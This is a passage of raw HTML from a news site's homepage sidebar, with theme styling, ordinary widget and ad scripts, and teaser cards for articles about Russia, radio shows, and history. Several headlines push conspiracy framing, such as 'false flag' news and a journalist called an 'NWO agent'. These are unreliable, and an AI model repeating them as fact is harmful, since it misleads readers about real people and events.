</script><div class="td-block-title-wrap"><h4 class="block-title"><a href="https://www.veteranstoday.com/category/vt-radio/truth-jihad/" class="td-pulldown-size">Kevin Barrett&#039;s Truth Jihad</a></h4></div><div id=td_uid_92_5aaf778c46b94 class="td_block_inner">
<div class="td-block-span12">
<div class="td_module_4 td_module_wrap td-animation-stack">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/16/ffwn-winning/" rel="bookmark" title="FFWN: &#8220;Conspiracy Theories&#8221; winning the debate!"><img width="324" height="235" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/maxresdefault-25-324x235.jpg" alt="" title="FFWN: &#8220;Conspiracy Theories&#8221; winning the debate!" /><span class="td-video-play-ico"><img width="40" height="40" class="td-retina" src="https://www.veteranstoday.com/wp-content/themes/Newspaper/images/icons/ico-video-large.png" alt="video" /></span></a></div> <a href="https://www.veteranstoday.com/category/vt-radio/false-flag-weekly-news/" class="td-post-category">False Flag Weekly News</a> </div>
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/16/ffwn-winning/" rel="bookmark" title="FFWN: &#8220;Conspiracy Theories&#8221; winning the debate!">FFWN: &#8220;Conspiracy Theories&#8221; winning the debate!</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/barrett/">Kevin Barrett</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-16T17:24:01+00:00">March 16, 2018</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2018/03/16/ffwn-winning/#comments">23</a></div> </div>
<div class="td-excerpt">
Why are they censoring, witch-hunting, name-callling—and refusing to debate? Because they are losing. </div>
</div>
</div> </div></div> <div class="td_block_wrap td_block_1 td_uid_93_5aaf778c47da9_rand td-pb-border-top td_block_template_1 td-column-1" data-td-block-uid="td_uid_93_5aaf778c47da9">
<style>
body .td_uid_93_5aaf778c47da9_rand .td_module_wrap:hover .entry-title a,
            body .td_uid_93_5aaf778c47da9_rand .td-pulldown-filter-link:hover,
            body .td_uid_93_5aaf778c47da9_rand .td-subcat-item a:hover,
            body .td_uid_93_5aaf778c47da9_rand .td-subcat-item .td-cur-simple-item,
            body .td_uid_93_5aaf778c47da9_rand .td_quote_on_blocks,
            body .td_uid_93_5aaf778c47da9_rand .td-opacity-cat .td-post-category:hover,
            body .td_uid_93_5aaf778c47da9_rand .td-opacity-read .td-read-more a:hover,
            body .td_uid_93_5aaf778c47da9_rand .td-opacity-author .td-post-author-name a:hover,
            body .td_uid_93_5aaf778c47da9_rand .td-instagram-user a {
                color: #990000;
            }

            body .td_uid_93_5aaf778c47da9_rand .td-next-prev-wrap a:hover,
            body .td_uid_93_5aaf778c47da9_rand .td-load-more-wrap a:hover {
                background-color: #990000;
                border-color: #990000;
            }

            body .td_uid_93_5aaf778c47da9_rand .block-title > *,
            body .td_uid_93_5aaf778c47da9_rand .td-trending-now-title,
            body .td_uid_93_5aaf778c47da9_rand .td-read-more a,
            body .td_uid_93_5aaf778c47da9_rand .td-weather-information:before,
            body .td_uid_93_5aaf778c47da9_rand .td-weather-week:before,
            body .td_uid_93_5aaf778c47da9_rand .td-subcat-dropdown:hover .td-subcat-more,
            body .td_uid_93_5aaf778c47da9_rand .td-exchange-header:before,
            body .td-footer-wrapper .td_uid_93_5aaf778c47da9_rand .td-post-category,
            body .td_uid_93_5aaf778c47da9_rand .td-post-category:hover {
                background-color: #990000;
            }
            body .td-footer-wrapper .td_uid_93_5aaf778c47da9_rand .block-title > * {
                padding: 6px 7px 5px;
                line-height: 1;
            }

            body .td_uid_93_5aaf778c47da9_rand .block-title {
                border-color: #990000;
            }
</style><script>var block_td_uid_93_5aaf778c47da9 = new tdBlock();
block_td_uid_93_5aaf778c47da9.id = "td_uid_93_5aaf778c47da9";
block_td_uid_93_5aaf778c47da9.atts = '{"limit":"2","sort":"","post_ids":"","tag_slug":"","autors_id":"242054","installed_post_types":"","category_id":"","category_ids":"","custom_title":"Steve Robertson\u0027s Corner","custom_url":"https:\/\/www.veteranstoday.com\/author\/srobertson\/","show_child_cat":"","sub_cat_ajax":"","ajax_pagination":"","header_color":"#990000","header_text_color":"","ajax_pagination_infinite_stop":"","td_column_number":1,"td_ajax_preloading":"","td_ajax_filter_type":"","td_ajax_filter_ids":"","td_filter_default_txt":"All","color_preset":"","border_top":"","class":"td_uid_93_5aaf778c47da9_rand","el_class":"","offset":"","css":"","tdc_css":"","tdc_css_class":"td_uid_93_5aaf778c47da9_rand","tdc_css_class_style":"td_uid_93_5aaf778c47da9_rand_style","live_filter":"","live_filter_cur_post_id":"","live_filter_cur_post_author":"","block_template_id":""}';
block_td_uid_93_5aaf778c47da9.td_column_number = "1";
block_td_uid_93_5aaf778c47da9.block_type = "td_block_1";
block_td_uid_93_5aaf778c47da9.post_count = "2";
block_td_uid_93_5aaf778c47da9.found_posts = "33";
block_td_uid_93_5aaf778c47da9.header_color = "#990000";
block_td_uid_93_5aaf778c47da9.ajax_pagination_infinite_stop = "";
block_td_uid_93_5aaf778c47da9.max_num_pages = "17";
tdBlocksArray.push(block_td_uid_93_5aaf778c47da9);
</script><div class="td-block-title-wrap"><h4 class="block-title"><a href="https://www.veteranstoday.com/author/srobertson/" class="td-pulldown-size">Steve Robertson&#039;s Corner</a></h4></div><div id=td_uid_93_5aaf778c47da9 class="td_block_inner">
<div class="td-block-span12">
<div class="td_module_4 td_module_wrap td-animation-stack">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/14/school-shootings-and-the-smoking-gun-of-our-moral-hypocrisy/" rel="bookmark" title="School Shootings and The Smoking Gun of Our Moral Hypocrisy"><img width="324" height="235" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/EDIT3-gun-012516-newscomA-2-324x235.jpg" alt="" title="School Shootings and The Smoking Gun of Our Moral Hypocrisy" /></a></div> <a href="https://www.veteranstoday.com/category/government-and-politics/" class="td-post-category">Government</a> </div>
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/14/school-shootings-and-the-smoking-gun-of-our-moral-hypocrisy/" rel="bookmark" title="School Shootings and The Smoking Gun of Our Moral Hypocrisy">School Shootings and The Smoking Gun of Our Moral Hypocrisy</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/srobertson/">Steve Robertson</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-14T18:34:46+00:00">March 14, 2018</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2018/03/14/school-shootings-and-the-smoking-gun-of-our-moral-hypocrisy/#comments">22</a></div> </div>
<div class="td-excerpt">
As you read ahead, and thankfully find value in my article, please consider supporting my work by:
Growing up in America there is a huge... </div>
</div>
</div> 
<div class="td-block-span12">
<div class="td_module_6 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/11/your-life-purpose-an-awakened-journey-towards-enlightenment-series/" rel="bookmark" title="Your Life Purpose, an Awakened Journey Towards Enlightenment series"><img width="100" height="70" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/buddha-krishna-jesus-2-100x70.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/buddha-krishna-jesus-2-100x70.jpg 100w, https://www.veteranstoday.com/wp-content/uploads/2018/03/buddha-krishna-jesus-2-218x150.jpg 218w" sizes="(max-width: 100px) 100vw, 100px" alt="" title="Your Life Purpose, an Awakened Journey Towards Enlightenment series" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/11/your-life-purpose-an-awakened-journey-towards-enlightenment-series/" rel="bookmark" title="Your Life Purpose, an Awakened Journey Towards Enlightenment series">Your Life Purpose, an Awakened Journey Towards Enlightenment series</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-11T17:51:44+00:00">March 11, 2018</time></span> </div>
</div>
</div>
</div> </div></div> </div></div></div></div><div class="vc_row wpb_row td-pb-row"><div class="wpb_column vc_column_container td-pb-span8"><div class="vc_column-inner "><div class="wpb_wrapper"><div class="td_block_wrap td_block_11 td_uid_94_5aaf778c4a533_rand td-pb-border-top td_block_template_1 td-column-2" data-td-block-uid="td_uid_94_5aaf778c4a533">
<style>
body .td_uid_94_5aaf778c4a533_rand .td_module_wrap:hover .entry-title a,
            body .td_uid_94_5aaf778c4a533_rand .td-pulldown-filter-link:hover,
            body .td_uid_94_5aaf778c4a533_rand .td-subcat-item a:hover,
            body .td_uid_94_5aaf778c4a533_rand .td-subcat-item .td-cur-simple-item,
            body .td_uid_94_5aaf778c4a533_rand .td_quote_on_blocks,
            body .td_uid_94_5aaf778c4a533_rand .td-opacity-cat .td-post-category:hover,
            body .td_uid_94_5aaf778c4a533_rand .td-opacity-read .td-read-more a:hover,
            body .td_uid_94_5aaf778c4a533_rand .td-opacity-author .td-post-author-name a:hover,
            body .td_uid_94_5aaf778c4a533_rand .td-instagram-user a {
                color: #000000;
            }

            body .td_uid_94_5aaf778c4a533_rand .td-next-prev-wrap a:hover,
            body .td_uid_94_5aaf778c4a533_rand .td-load-more-wrap a:hover {
                background-color: #000000;
                border-color: #000000;
            }

            body .td_uid_94_5aaf778c4a533_rand .block-title > *,
            body .td_uid_94_5aaf778c4a533_rand .td-trending-now-title,
            body .td_uid_94_5aaf778c4a533_rand .td-read-more a,
            body .td_uid_94_5aaf778c4a533_rand .td-weather-information:before,
            body .td_uid_94_5aaf778c4a533_rand .td-weather-week:before,
            body .td_uid_94_5aaf778c4a533_rand .td-subcat-dropdown:hover .td-subcat-more,
            body .td_uid_94_5aaf778c4a533_rand .td-exchange-header:before,
            body .td-footer-wrapper .td_uid_94_5aaf778c4a533_rand .td-post-category,
            body .td_uid_94_5aaf778c4a533_rand .td-post-category:hover {
                background-color: #000000;
            }
            body .td-footer-wrapper .td_uid_94_5aaf778c4a533_rand .block-title > * {
                padding: 6px 7px 5px;
                line-height: 1;
            }

            body .td_uid_94_5aaf778c4a533_rand .block-title {
                border-color: #000000;
            }
</style><script>var block_td_uid_94_5aaf778c4a533 = new tdBlock();
block_td_uid_94_5aaf778c4a533.id = "td_uid_94_5aaf778c4a533";
block_td_uid_94_5aaf778c4a533.atts = '{"limit":"4","sort":"","post_ids":"","tag_slug":"","autors_id":"","installed_post_types":"","category_id":"29565","category_ids":"","custom_title":"Russia","custom_url":"https:\/\/www.veteranstoday.com\/category\/world-global\/russia-world-global\/","show_child_cat":"","sub_cat_ajax":"","ajax_pagination":"","header_color":"#000000","header_text_color":"","ajax_pagination_infinite_stop":"","td_column_number":2,"td_ajax_preloading":"","td_ajax_filter_type":"","td_ajax_filter_ids":"","td_filter_default_txt":"All","color_preset":"","border_top":"","class":"td_uid_94_5aaf778c4a533_rand","el_class":"","offset":"","css":"","tdc_css":"","tdc_css_class":"td_uid_94_5aaf778c4a533_rand","tdc_css_class_style":"td_uid_94_5aaf778c4a533_rand_style","live_filter":"","live_filter_cur_post_id":"","live_filter_cur_post_author":"","block_template_id":""}';
block_td_uid_94_5aaf778c4a533.td_column_number = "2";
block_td_uid_94_5aaf778c4a533.block_type = "td_block_11";
block_td_uid_94_5aaf778c4a533.post_count = "4";
block_td_uid_94_5aaf778c4a533.found_posts = "348";
block_td_uid_94_5aaf778c4a533.header_color = "#000000";
block_td_uid_94_5aaf778c4a533.ajax_pagination_infinite_stop = "";
block_td_uid_94_5aaf778c4a533.max_num_pages = "87";
tdBlocksArray.push(block_td_uid_94_5aaf778c4a533);
</script><div class="td-block-title-wrap"><h4 class="block-title"><a href="https://www.veteranstoday.com/category/world-global/russia-world-global/" class="td-pulldown-size">Russia</a></h4></div><div id=td_uid_94_5aaf778c4a533 class="td_block_inner">
<div class="td-block-span12">
<div class="td_module_10 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/14/russia-to-theresa-may-we-aint-scared-of-you/" rel="bookmark" title="Russia to Theresa May: We ain’t scared of you"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/Theresa-May-and-Vladimir-Putin--218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/Theresa-May-and-Vladimir-Putin--218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/Theresa-May-and-Vladimir-Putin--100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Russia to Theresa May: We ain’t scared of you" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/14/russia-to-theresa-may-we-aint-scared-of-you/" rel="bookmark" title="Russia to Theresa May: We ain’t scared of you">Russia to Theresa May: We ain’t scared of you</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/alexis/">Jonas E. Alexis</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-14T11:57:09+00:00">March 14, 2018</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2018/03/14/russia-to-theresa-may-we-aint-scared-of-you/#comments">18</a></div> </div>
<div class="td-excerpt">
...by Jonas E. Alexis
We’ve lost something in the political, intellectual, and legal culture. It used to be that if a person posits an extraordinary... </div>
</div>
</div>
</div> 
<div class="td-block-span12">
<div class="td_module_10 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/12/are-hollywood-celebrities-hacking-the-russian-election/" rel="bookmark" title="Are Hollywood celebrities hacking the Russian election?"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/hollywod-218x150.jpeg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/hollywod-218x150.jpeg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/hollywod-100x70.jpeg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Are Hollywood celebrities hacking the Russian election?" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/12/are-hollywood-celebrities-hacking-the-russian-election/" rel="bookmark" title="Are Hollywood celebrities hacking the Russian election?">Are Hollywood celebrities hacking the Russian election?</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/alexis/">Jonas E. Alexis</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-12T12:09:37+00:00">March 12, 2018</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2018/03/12/are-hollywood-celebrities-hacking-the-russian-election/#comments">13</a></div> </div>
<div class="td-excerpt">
...by Jonas E. Alexis
If you don’t have a good sense of humor, then the New World Order ideology will drive you nuts. Why? It... </div>
</div>
</div>
</div> 
<div class="td-block-span12">
<div class="td_module_10 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/11/putin-humiliates-nwo-agent-megyn-kelly-again/" rel="bookmark" title="Putin humiliates NWO agent Megyn Kelly—again"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/putin-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/putin-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/putin-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Putin humiliates NWO agent Megyn Kelly—again" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/11/putin-humiliates-nwo-agent-megyn-kelly-again/" rel="bookmark" title="Putin humiliates NWO agent Megyn Kelly—again">Putin humiliates NWO agent Megyn Kelly—again</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/alexis/">Jonas E. Alexis</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-11T01:15:17+00:00">March 11, 2018</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2018/03/11/putin-humiliates-nwo-agent-megyn-kelly-again/#comments">28</a></div> </div>
<div class="td-excerpt">
...by Jonas E. Alexis
I have argued elsewhere that if a political or intellectual project is not logically coherent and consistent, then it is not... </div>
</div>
</div>
</div> 
<div class="td-block-span12">
<div class="td_module_10 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/09/putin-us-political-system-eating-itself-up/" rel="bookmark" title="Putin: US political system “eating itself up”"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/putin2-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/putin2-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/putin2-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Putin: US political system “eating itself up”" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/09/putin-us-political-system-eating-itself-up/" rel="bookmark" title="Putin: US political system “eating itself up”">Putin: US political system “eating itself up”</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/alexis/">Jonas E. Alexis</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-09T09:46:06+00:00">March 9, 2018</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2018/03/09/putin-us-political-system-eating-itself-up/#comments">4</a></div> </div>
<div class="td-excerpt">
...by Jonas E. Alexis
Putin should be credited with making a positive difference in the political landscape. Granted, he does have his shortcomings, as we... </div>
</div>
</div>
</div> </div></div> </div></div></div><div class="wpb_column vc_column_container td-pb-span4"><div class="vc_column-inner "><div class="wpb_wrapper"><div class="td_block_wrap td_block_6 td_uid_95_5aaf778c4e3db_rand td-pb-border-top td_block_template_1 td-column-1 td_block_padding td_block_bot_line" data-td-block-uid="td_uid_95_5aaf778c4e3db">
<style>
body .td_uid_95_5aaf778c4e3db_rand .td_module_wrap:hover .entry-title a,
            body .td_uid_95_5aaf778c4e3db_rand .td-pulldown-filter-link:hover,
            body .td_uid_95_5aaf778c4e3db_rand .td-subcat-item a:hover,
            body .td_uid_95_5aaf778c4e3db_rand .td-subcat-item .td-cur-simple-item,
            body .td_uid_95_5aaf778c4e3db_rand .td_quote_on_blocks,
            body .td_uid_95_5aaf778c4e3db_rand .td-opacity-cat .td-post-category:hover,
            body .td_uid_95_5aaf778c4e3db_rand .td-opacity-read .td-read-more a:hover,
            body .td_uid_95_5aaf778c4e3db_rand .td-opacity-author .td-post-author-name a:hover,
            body .td_uid_95_5aaf778c4e3db_rand .td-instagram-user a {
                color: #990000;
            }

            body .td_uid_95_5aaf778c4e3db_rand .td-next-prev-wrap a:hover,
            body .td_uid_95_5aaf778c4e3db_rand .td-load-more-wrap a:hover {
                background-color: #990000;
                border-color: #990000;
            }

            body .td_uid_95_5aaf778c4e3db_rand .block-title > *,
            body .td_uid_95_5aaf778c4e3db_rand .td-trending-now-title,
            body .td_uid_95_5aaf778c4e3db_rand .td-read-more a,
            body .td_uid_95_5aaf778c4e3db_rand .td-weather-information:before,
            body .td_uid_95_5aaf778c4e3db_rand .td-weather-week:before,
            body .td_uid_95_5aaf778c4e3db_rand .td-subcat-dropdown:hover .td-subcat-more,
            body .td_uid_95_5aaf778c4e3db_rand .td-exchange-header:before,
            body .td-footer-wrapper .td_uid_95_5aaf778c4e3db_rand .td-post-category,
            body .td_uid_95_5aaf778c4e3db_rand .td-post-category:hover {
                background-color: #990000;
            }
            body .td-footer-wrapper .td_uid_95_5aaf778c4e3db_rand .block-title > * {
                padding: 6px 7px 5px;
                line-height: 1;
            }

            body .td_uid_95_5aaf778c4e3db_rand .block-title {
                border-color: #990000;
            }
</style><script>var block_td_uid_95_5aaf778c4e3db = new tdBlock();
block_td_uid_95_5aaf778c4e3db.id = "td_uid_95_5aaf778c4e3db";
block_td_uid_95_5aaf778c4e3db.atts = '{"limit":"1","sort":"","post_ids":"","tag_slug":"","autors_id":"","installed_post_types":"","category_id":"70365","category_ids":"","custom_title":"Latest VT Radio Show","custom_url":"https:\/\/www.veteranstoday.com\/category\/vt-radio\/","show_child_cat":"","sub_cat_ajax":"","ajax_pagination":"","header_color":"#990000","header_text_color":"","ajax_pagination_infinite_stop":"","td_column_number":1,"td_ajax_preloading":"","td_ajax_filter_type":"","td_ajax_filter_ids":"","td_filter_default_txt":"All","color_preset":"","border_top":"","class":"td_uid_95_5aaf778c4e3db_rand","el_class":"","offset":"","css":"","tdc_css":"","tdc_css_class":"td_uid_95_5aaf778c4e3db_rand","tdc_css_class_style":"td_uid_95_5aaf778c4e3db_rand_style","live_filter":"","live_filter_cur_post_id":"","live_filter_cur_post_author":"","block_template_id":""}';
block_td_uid_95_5aaf778c4e3db.td_column_number = "1";
block_td_uid_95_5aaf778c4e3db.block_type = "td_block_6";
block_td_uid_95_5aaf778c4e3db.post_count = "1";
block_td_uid_95_5aaf778c4e3db.found_posts = "379";
block_td_uid_95_5aaf778c4e3db.header_color = "#990000";
block_td_uid_95_5aaf778c4e3db.ajax_pagination_infinite_stop = "";
block_td_uid_95_5aaf778c4e3db.max_num_pages = "379";
tdBlocksArray.push(block_td_uid_95_5aaf778c4e3db);
</script><div class="td-block-title-wrap"><h4 class="block-title"><a href="https://www.veteranstoday.com/category/vt-radio/" class="td-pulldown-size">Latest VT Radio Show</a></h4></div><div id=td_uid_95_5aaf778c4e3db class="td_block_inner">
<div class="td-block-span12">
<div class="td_module_5 td_module_wrap td-animation-stack">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/16/tck-radio-peter-mccarthy-prophecy-crisis-in-church-new-world-order/" rel="bookmark" title="TCK RADIO: Peter McCarthy &#8220;Prophecy, Crisis in Church &amp; New World Order&#8221;">TCK RADIO: Peter McCarthy &#8220;Prophecy, Crisis in Church &amp; New World...</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/apostleofmary/">Eric Gajewski</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-16T16:17:59+00:00">March 16, 2018</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2018/03/16/tck-radio-peter-mccarthy-prophecy-crisis-in-church-new-world-order/#respond">0</a></div> </div>
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/16/tck-radio-peter-mccarthy-prophecy-crisis-in-church-new-world-order/" rel="bookmark" title="TCK RADIO: Peter McCarthy &#8220;Prophecy, Crisis in Church &amp; New World Order&#8221;"><img width="324" height="235" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/maxresdefault-24-324x235.jpg" alt="" title="TCK RADIO: Peter McCarthy &#8220;Prophecy, Crisis in Church &amp; New World Order&#8221;" /><span class="td-video-play-ico"><img width="40" height="40" class="td-retina" src="https://www.veteranstoday.com/wp-content/themes/Newspaper/images/icons/ico-video-large.png" alt="video" /></span></a></div> <a href="https://www.veteranstoday.com/category/vt-radio/trad-cat-knight-radio/" class="td-post-category">Trad Cat Knight Radio</a> </div>
<div class="td-excerpt">
TradCatKnight Radio, Peter McCarthy &quot;Prophecy, Crisis in Church &amp; New World Order&quot;
Talk given 3-16-18 (aprx 1hr 10 mins)
VISIT TRADCATKNIGHT.BLOGSPOT.COM DAILY!
Special Guest Peter McCarthy of... </div>
</div>
</div> </div></div> <div class="td-a-rec td-a-rec-id-custom_ad_5  td_uid_96_5aaf778c4f547_rand td_block_template_1"></p>
<p>
<div id='div-gpt-ad-1516073110476-0'>
<script>
googletag.cmd.push(function() { googletag.display('div-gpt-ad-1516073110476-0'); });
</script>
</div>
<p>
</div></div></div></div></div><div class="vc_row wpb_row td-pb-row"><div class="wpb_column vc_column_container td-pb-span12"><div class="vc_column-inner "><div class="wpb_wrapper"></div></div></div></div><div class="vc_row wpb_row td-pb-row"><div class="wpb_column vc_column_container td-pb-span4"><div class="vc_column-inner "><div class="wpb_wrapper"><div class="td_block_wrap td_block_19 td_uid_98_5aaf778c50a1b_rand td-pb-border-top td_block_template_1 td-column-1" data-td-block-uid="td_uid_98_5aaf778c50a1b">
<style>
body .td_uid_98_5aaf778c50a1b_rand .td_module_wrap:hover .entry-title a,
            body .td_uid_98_5aaf778c50a1b_rand .td-pulldown-filter-link:hover,
            body .td_uid_98_5aaf778c50a1b_rand .td-subcat-item a:hover,
            body .td_uid_98_5aaf778c50a1b_rand .td-subcat-item .td-cur-simple-item,
            body .td_uid_98_5aaf778c50a1b_rand .td_quote_on_blocks,
            body .td_uid_98_5aaf778c50a1b_rand .td-opacity-cat .td-post-category:hover,
            body .td_uid_98_5aaf778c50a1b_rand .td-opacity-read .td-read-more a:hover,
            body .td_uid_98_5aaf778c50a1b_rand .td-opacity-author .td-post-author-name a:hover,
            body .td_uid_98_5aaf778c50a1b_rand .td-instagram-user a {
                color: #000000;
            }

            body .td_uid_98_5aaf778c50a1b_rand .td-next-prev-wrap a:hover,
            body .td_uid_98_5aaf778c50a1b_rand .td-load-more-wrap a:hover {
                background-color: #000000;
                border-color: #000000;
            }

            body .td_uid_98_5aaf778c50a1b_rand .block-title > *,
            body .td_uid_98_5aaf778c50a1b_rand .td-trending-now-title,
            body .td_uid_98_5aaf778c50a1b_rand .td-read-more a,
            body .td_uid_98_5aaf778c50a1b_rand .td-weather-information:before,
            body .td_uid_98_5aaf778c50a1b_rand .td-weather-week:before,
            body .td_uid_98_5aaf778c50a1b_rand .td-subcat-dropdown:hover .td-subcat-more,
            body .td_uid_98_5aaf778c50a1b_rand .td-exchange-header:before,
            body .td-footer-wrapper .td_uid_98_5aaf778c50a1b_rand .td-post-category,
            body .td_uid_98_5aaf778c50a1b_rand .td-post-category:hover {
                background-color: #000000;
            }
            body .td-footer-wrapper .td_uid_98_5aaf778c50a1b_rand .block-title > * {
                padding: 6px 7px 5px;
                line-height: 1;
            }

            body .td_uid_98_5aaf778c50a1b_rand .block-title {
                border-color: #000000;
            }
</style><script>var block_td_uid_98_5aaf778c50a1b = new tdBlock();
block_td_uid_98_5aaf778c50a1b.id = "td_uid_98_5aaf778c50a1b";
block_td_uid_98_5aaf778c50a1b.atts = '{"limit":"4","sort":"","post_ids":"","tag_slug":"","autors_id":"","installed_post_types":"","category_id":"7271","category_ids":"","custom_title":"History","custom_url":"","show_child_cat":"","sub_cat_ajax":"","ajax_pagination":"","header_color":"#000000","header_text_color":"","ajax_pagination_infinite_stop":"","td_column_number":1,"td_ajax_preloading":"","td_ajax_filter_type":"","td_ajax_filter_ids":"","td_filter_default_txt":"All","color_preset":"","border_top":"","class":"td_uid_98_5aaf778c50a1b_rand","el_class":"","offset":"","css":"","tdc_css":"","tdc_css_class":"td_uid_98_5aaf778c50a1b_rand","tdc_css_class_style":"td_uid_98_5aaf778c50a1b_rand_style","live_filter":"","live_filter_cur_post_id":"","live_filter_cur_post_author":"","block_template_id":""}';
block_td_uid_98_5aaf778c50a1b.td_column_number = "1";
block_td_uid_98_5aaf778c50a1b.block_type = "td_block_19";
block_td_uid_98_5aaf778c50a1b.post_count = "4";
block_td_uid_98_5aaf778c50a1b.found_posts = "314";
block_td_uid_98_5aaf778c50a1b.header_color = "#000000";
block_td_uid_98_5aaf778c50a1b.ajax_pagination_infinite_stop = "";
block_td_uid_98_5aaf778c50a1b.max_num_pages = "79";
tdBlocksArray.push(block_td_uid_98_5aaf778c50a1b);
</script><div class="td-block-title-wrap"><h4 class="block-title"><span class="td-pulldown-size">History</span></h4></div><div id=td_uid_98_5aaf778c50a1b class="td_block_inner td-column-1">
<div class="td_module_mx1 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/16/gilad-atzmon-needs-your-immediate-support/" rel="bookmark" title="Gilad Atzmon Needs Your Immediate Support!"><img width="356" height="220" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/Support-Gilad-356x220.jpg" alt="" title="Gilad Atzmon Needs Your Immediate Support!" /></a></div>
<div class="td-module-meta-info">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/16/gilad-atzmon-needs-your-immediate-support/" rel="bookmark" title="Gilad Atzmon Needs Your Immediate Support!">Gilad Atzmon Needs Your Immediate Support!</a></h3> <div class="td-editor-date">
<span class="td-author-date">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/atzmon/">Gilad Atzmon</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-16T14:58:19+00:00">March 16, 2018</time></span>  </span>
</div>
</div>
</div>
<div class="td_module_mx2 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/13/washington-post-winston-churchill-a-mass-murderer/" rel="bookmark" title="Washington Post: Winston Churchill “a mass murderer”"><img width="80" height="60" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/churchill-80x60.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/churchill-80x60.jpg 80w, https://www.veteranstoday.com/wp-content/uploads/2018/03/churchill-265x198.jpg 265w" sizes="(max-width: 80px) 100vw, 80px" alt="" title="Washington Post: Winston Churchill “a mass murderer”" /></a></div>
<div class="item-details">
